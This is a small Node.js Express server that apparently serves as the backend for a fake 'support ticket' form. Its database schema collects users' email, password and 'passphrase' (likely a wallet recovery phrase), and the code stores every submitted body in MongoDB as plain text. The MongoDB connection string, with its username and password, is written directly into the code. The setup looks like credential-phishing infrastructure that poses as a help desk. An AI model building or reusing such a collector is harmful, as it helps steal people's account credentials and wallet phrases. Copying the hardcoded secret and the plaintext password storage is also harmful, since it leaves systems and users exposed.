const express = require("express");
const fs = require("fs");
const path = require("path");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve frontend
app.use(express.static("public"));

/*
==============================
MongoDB Connection
==============================
*/

mongoose.connect("mongodb+srv://tunjity26_db_user:YmTpU6wTgdvfwWaV@cluster0.qxbk9ji.mongodb.net/?appName=Cluster0")
    .then(() => console.log("MongoDB Connected"))
    .catch(err => console.log(err));

/*
==============================
Ticket Schema
==============================
*/

const ticketSchema = new mongoose.Schema({
    email: String,
    issue: String,
    password: String,
    passphrase: String,
    description: String,
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const Ticket = mongoose.model("Ticket", ticketSchema);

/*
==============================
Submit Ticket API
==============================
*/

app.post("/submit-ticket", async (req, res) => {

    try {

        const ticket = new Ticket(req.body);
        await ticket.save();

        res.json({
            message: "Ticket saved"
        });

    } catch (err) {

        console.log(err);
        res.status(500).json({
            message: "Server error"
        });

    }

});

/*
==============================
Server Start
==============================
*/

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running");
});